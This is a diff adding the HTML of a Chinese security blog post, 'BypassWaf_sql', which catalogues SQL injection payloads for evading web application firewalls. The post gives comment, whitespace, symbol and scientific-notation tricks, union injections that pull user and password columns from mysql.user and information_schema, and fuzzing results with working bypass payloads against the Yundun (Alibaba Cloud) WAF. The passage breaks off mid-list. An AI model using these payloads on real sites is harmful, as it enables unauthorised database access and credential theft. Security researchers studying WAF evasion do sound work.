@@ -1,0 +1,1101 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="0x01 BypassWaf_sql**1. 数据库特性①注释 12345678#---- ---+///**//*letmetest*/;%00   但/**/ &amp;gt; 1个就可以绕过waf 科学计数法 1select id,id_number,weibo from table where id=0e1union select user,password,1e1from mysql.user">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BypassWaf_sql">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/07/2019-1-7-BypassWaf_sql/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="0x01 BypassWaf_sql**1. 数据库特性①注释 12345678#---- ---+///**//*letmetest*/;%00   但/**/ &amp;gt; 1个就可以绕过waf 科学计数法 1select id,id_number,weibo from table where id=0e1union select user,password,1e1from mysql.user">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl7t8lzqkj215u0qjdj9.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyx86ua17xj20qz0h60we.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyx851c8dbj20oh0d7mxk.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyy2o3ffeyj20md08n3yp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyya6vigxuj20py0fedhq.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyakczniyj20p60hjtfc.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyb3erd5pj20wz0gnwjb.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyybvvpgi8j20m70awadq.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyd1s0dvpj20sa0ittlp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyd65c2f8j20yg0g7tld.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyydbfotp2j20sp0gktas.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyyddqlzufj20vp0fsn0n.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyydfv8surj20o70jbn80.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyydktkc14j20us0b6jv1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyydjllwo8j20ry02mgma.jpg">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.324Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BypassWaf_sql">
+<meta name="twitter:description" content="0x01 BypassWaf_sql**1. 数据库特性①注释 12345678#---- ---+///**//*letmetest*/;%00   但/**/ &amp;gt; 1个就可以绕过waf 科学计数法 1select id,id_number,weibo from table where id=0e1union select user,password,1e1from mysql.user">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl7t8lzqkj215u0qjdj9.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/07/2019-1-7-BypassWaf_sql/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>BypassWaf_sql | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/07/2019-1-7-BypassWaf_sql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">BypassWaf_sql
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-07 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-07T00:00:00+08:00">2019-01-07</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">12k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">11 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyl7t8lzqkj215u0qjdj9.jpg" alt></p>
+<h1 id="0x01-BypassWaf-sql"><a href="#0x01-BypassWaf-sql" class="headerlink" title="0x01 BypassWaf_sql**"></a>0x01 BypassWaf_sql**</h1><h2 id="1-数据库特性"><a href="#1-数据库特性" class="headerlink" title="1. 数据库特性"></a>1. 数据库特性</h2><p><strong>①注释</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">//</span><br><span class="line">/**/</span><br><span class="line">/*letmetest*/</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyx86ua17xj20qz0h60we.jpg" alt></p>
+<p>但/**/ &gt; 1个就可以绕过waf</p>
+<p><strong>科学计数法</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,id_number,weibo from table where id=0e1union select user,password,1e1from mysql.user</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyx851c8dbj20oh0d7mxk.jpg" alt></p>
+<p><strong>空白字符：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SQLite3 0A 0D 0C 09 20  MySQL5 09 0A 0B 0C 0D A0 20</span><br><span class="line">PosgresSQL 0A 0D 0C 09 20  Oracle 11g 00 0A 0D 0C 09 20</span><br><span class="line">MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16 ,17,18,19,1A,1B,1C,1D,1E,1F,2</span><br></pre></td></tr></table></figure>
+
+<p><strong>+号</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1e8</span><span class="keyword">union</span>(<span class="keyword">select</span>+<span class="number">1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>));</span><br><span class="line">union(<span class="keyword">select</span>+<span class="number">1</span>,(information_schema));</span><br></pre></td></tr></table></figure>
+
+<p><strong>-号</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1e8</span><span class="keyword">union</span>(<span class="keyword">select</span><span class="number">-1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<p><strong>`号</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1e8</span><span class="keyword">union</span>(<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="string">`schema_name`</span> <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<p><strong>~号</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1e8</span><span class="keyword">union</span>(<span class="keyword">select</span>~<span class="number">1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<p><strong>!号</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1e8</span><span class="keyword">union</span>(<span class="keyword">select</span>!<span class="number">1</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<p><strong>@`形式</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1e8</span><span class="keyword">union</span>(<span class="keyword">select</span>@<span class="string">`1`</span>,(<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<p><strong>点号.1</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span><span class="comment">/*.1*/</span><span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyy2o3ffeyj20md08n3yp.jpg" alt></p>
+<p><strong>单引号双引号</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">.1</span><span class="keyword">union</span><span class="comment">/*.1*/</span><span class="keyword">select</span><span class="string">"1"</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>括号select(1)</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1e8</span><span class="keyword">union</span>(<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span>(schema_name)<span class="keyword">from</span> information_schema.schemata <span class="keyword">limit</span> <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>mysql中的union用法</strong></p>
+<p><strong>union查询就是把2条或者多条sql语句的查询结果，合并成一个结果集。</strong></p>
+<p>如：sql1: N行，sql2: M行，sql1 union sql2 ---&gt; N+M行</p>
+<p><strong>1、能否从2张表查询再union呢?</strong></p>
+<p>可以,union 合并的是&quot;结果集&quot;,不区分在自于哪一张表.</p>
+<p><strong>2、取自于2张表,通过&quot;别名&quot;让2个结果集的列一致。那么,如果取出的结果集,列名字不一样,还能否union.</strong></p>
+<p>可以,而且取出的最终列名,以第1条sql为准</p>
+<p><strong>3、union满足什么条件就可以用了?</strong></p>
+<p>只要结果集中的列数一致就可以.（如都是2列或者N列）</p>
+<p><strong>4、union后结果集,可否再排序呢?</strong></p>
+<p>可以的。Sql1 union sql2 order by 字段</p>
+<p>注意: order by 是针对合并后的结果集排的序.</p>
+<p><strong>5、如果Union后的结果有重复(即某2行,或N行,所有的列,值都一样),怎么办?</strong></p>
+<p>这种情况是比较常见的,默认会去重.</p>
+<p><strong>6、如果不想去重怎么办?</strong></p>
+<p>union all</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1、 union会去掉重复的行</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">num</span> <span class="keyword">FROM</span> num_a <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">num</span> <span class="keyword">FROM</span> num_b</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、<span class="keyword">order</span> <span class="keyword">by</span>对<span class="keyword">union</span>后的结果集排序</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">num</span> <span class="keyword">FROM</span> num_a <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">num</span> <span class="keyword">FROM</span> num_b <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">num</span> <span class="keyword">DESC</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、<span class="keyword">UNION</span> <span class="keyword">ALL</span>不会过滤重复的行</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">num</span> <span class="keyword">FROM</span> num_a <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">num</span> <span class="keyword">FROM</span> num_b</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、把num_a和num_b不同的索引结果保留， 相同的索引结果相加  然后输出：</span><br><span class="line"><span class="keyword">SELECT</span> a.id, ( a.num + b.num ) <span class="keyword">AS</span> <span class="keyword">num</span> <span class="keyword">FROM</span> num_a <span class="keyword">AS</span> a <span class="keyword">INNER</span> <span class="keyword">JOIN</span> num_b <span class="keyword">AS</span> b <span class="keyword">ON</span> a.id = b.id</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> num_a <span class="keyword">AS</span> a <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>( <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> num_b <span class="keyword">AS</span> b <span class="keyword">WHERE</span> a.id = b.id )</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> num_b <span class="keyword">AS</span> b <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>( <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> num_a <span class="keyword">AS</span> a <span class="keyword">WHERE</span> a.id = b.id )</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">ASC</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、第二种方法用子查询分组统计，也可以达到同样的效果</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">SUM</span>( <span class="keyword">num</span> ) <span class="keyword">AS</span> <span class="keyword">num</span> <span class="keyword">FROM</span> ( <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> num_a a <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> num_b b ) tmp</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">id</span>;</span><br><span class="line">https://www.cnblogs.com/ghostwu/p/8544333.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-Fuzzing"><a href="#2-Fuzzing" class="headerlink" title="2. Fuzzing"></a>2. Fuzzing</h2><p><strong>云盾</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">union+<span class="keyword">select</span> 拦截</span><br><span class="line"><span class="keyword">select</span>+<span class="keyword">from</span> 不拦截</span><br><span class="line"><span class="keyword">select</span>+<span class="keyword">from</span>+表名 拦截</span><br><span class="line"><span class="keyword">union</span>(<span class="keyword">select</span>) 不拦截 所以可以不用在乎这个<span class="keyword">union</span>了。</span><br><span class="line"><span class="keyword">union</span>(<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> ddd) 拦截</span><br><span class="line"><span class="keyword">union</span>(<span class="keyword">select</span>%<span class="number">0</span>aall) 不拦截</span><br><span class="line"><span class="keyword">union</span>(<span class="keyword">select</span>%<span class="number">0</span>aall <span class="keyword">user</span> <span class="keyword">from</span> ddd) 拦截</span><br><span class="line">fuzz下<span class="keyword">select</span>%<span class="number">0</span>aall与字段之间 + 字段与<span class="keyword">from</span>之间 + <span class="keyword">from</span>与表名之间 + 表名与末尾圆括号之间可插入的符号。</span><br><span class="line"><span class="keyword">union</span>(<span class="keyword">select</span>%<span class="number">0</span>aall&#123;<span class="keyword">user</span>&#125;<span class="keyword">from</span>&#123;ddd&#125;) 不拦截</span><br><span class="line">crlf:</span><br><span class="line">%<span class="number">0</span>d=/r	回车符号</span><br><span class="line">%<span class="number">0</span>a=/n	换行符号</span><br><span class="line"><span class="string">"/r/n"</span><span class="comment">------0d0a	windows 常用</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Bypass Payload：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 union(<span class="keyword">select</span>%<span class="number">0</span>aall&#123;x <span class="keyword">users</span>&#125;<span class="keyword">from</span>&#123;x ddd&#125;)</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span>(<span class="keyword">select</span>%<span class="number">0</span>adistinct&#123;x <span class="keyword">users</span>&#125;<span class="keyword">from</span>&#123;x ddd&#125;)</span><br><span class="line"><span class="number">1</span> <span class="keyword">union</span>(<span class="keyword">select</span>%<span class="number">0</span>adistinctrow&#123;x <span class="keyword">users</span>&#125;<span class="keyword">from</span>&#123;x ddd&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><strong>可运用的sql函数&amp;关键字：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">MySQL：</span><br><span class="line">union distinct</span><br><span class="line">union distinctrow</span><br><span class="line">procedure analyse()</span><br><span class="line">updatexml()</span><br><span class="line">extracavalue()</span><br><span class="line">exp()</span><br><span class="line">ceil()</span><br><span class="line">atan()</span><br><span class="line">sqrt()</span><br><span class="line">floor()</span><br><span class="line">ceiling()</span><br><span class="line">tan()</span><br><span class="line">rand()</span><br><span class="line">sign()</span><br><span class="line">greatest()</span><br><span class="line">字符串截取函数</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line">字符串连接函数</span><br><span class="line">concat(version(),'|',user());</span><br><span class="line">concat_ws('|',1,2,3)</span><br><span class="line">字符转换</span><br><span class="line">Char(49)</span><br><span class="line">Hex('a')</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br><span class="line"></span><br><span class="line">MSSQL：</span><br><span 